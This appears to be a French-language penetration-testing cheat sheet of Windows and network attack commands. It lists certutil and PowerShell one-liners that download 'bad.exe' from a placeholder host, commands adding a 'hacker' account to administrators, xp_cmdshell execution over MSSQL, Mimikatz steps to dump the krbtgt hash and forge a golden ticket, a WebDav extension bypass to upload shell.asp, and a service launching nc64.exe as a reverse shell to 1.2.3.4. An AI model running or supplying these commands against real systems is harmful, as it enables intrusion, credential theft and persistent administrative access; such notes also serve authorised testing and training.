<h2>Batch</h2>

`systeminfo` → Obtenir des renseignements sur le système

`tasklist` → Lister les processus

`netstat -ano` → Liste des connexions tcp

`dir sysprep /s /b` → Trouver un fichier dans le repertoire courant et ses sous-dossiers

`wmic qfe list` → Lister les patch installés (KB)

`certutil.exe -urlcache -split -f "http://site.com/bad.exe" bad.exe` → Wget en batch

`certutil.exe -decode bad.txt bad.exe` → Base64 decode en cmd

`net user Domain/hacker hackerhacker /add` → Ajoute un utilisateur

`net localgroup administrators hacker /add` → Ajoute un utilisateur à un groupe

`net use k: \\srv.remote.org\c$` → Connexion au disque distant c sur la partition k

`wmic useraccount where name='user'` → Récupère des informations sur un utilisateur (SID)

`net users [username]` pour obtenir des renseignements sur les utilisateurs

`net account` information sur la politique de mot de passe

## Samba

#### smbclient

Trouver la version

```
nmap -v -sSVC -p445 --script smb-os-discovery host
```

Exemple de share connus: IPC$, 
Connexion en tant qu'utilisateur Guest

```
smbclient -U guest% \\\\host\\share
```

Connexion en tant qu'anonyme

```
smbclient -U "" -N \\\\host\\share
```

Énumération de share

```
smbclient -U "" -N -L \\\\host\\share
nmap -v --script smb-enum-shares -p U:137,T:139 host
```

## MSSQL

#### sqsh

```
sqsh -S 1.2.3.4 -u user
EXEC master..xp_cmdshell 'whoami'
go
```

<h2>Powershell</h2>

`{(New-Object System.Net.WebClient).DownloadFile("http://site.com/file", "C:\\Users\Public\file")}` → Wget en powershell

`get-WmiObject -class Win32_Share`

<h2>Mimikatz</h2>

`privilege::debug`

`lsadump::lsa /inject /name:krbtgt` → Récupérer le NTLM hash de krbtgt

`kerberos::golden /user:[USER] /domain:[DOMAINE] /sid:[SID de USER] /krbtgt:[NTLM hash de krbtgt] /ticket:evil.tck /ptt` → Créé et inject un golden ticket à la session


## WebDav

Cadaver pour se connecter,
Sur Windows 2000/2003, bypass la restriction de l'extension avec shell.asp;.jpg

```
PUT shell.jpg
COPY shell.asp;.jpg
```

## SMTP

Connexion TLS (début plaintext puis TLS)

```
openssl s_client -connect 1.2.3.4:587 -starttls smtp
```

Connexion SSL 

```
openssl s_client -connect 1.2.3.4:465 -crlf
```

## Privesc

Créer un service (groupe administrateur):

```
sc create cmdsvc binpath= "C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd" type= own type= interact
sc cmdsvc start
```

Churrasco (NT Authorithy \ Network Service), lancer deux fois maybe: 

```
churrasco.exe
```

## Pivoting

Port forwarding natif windows:

```
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=4445 connectaddress=<your.address>
```
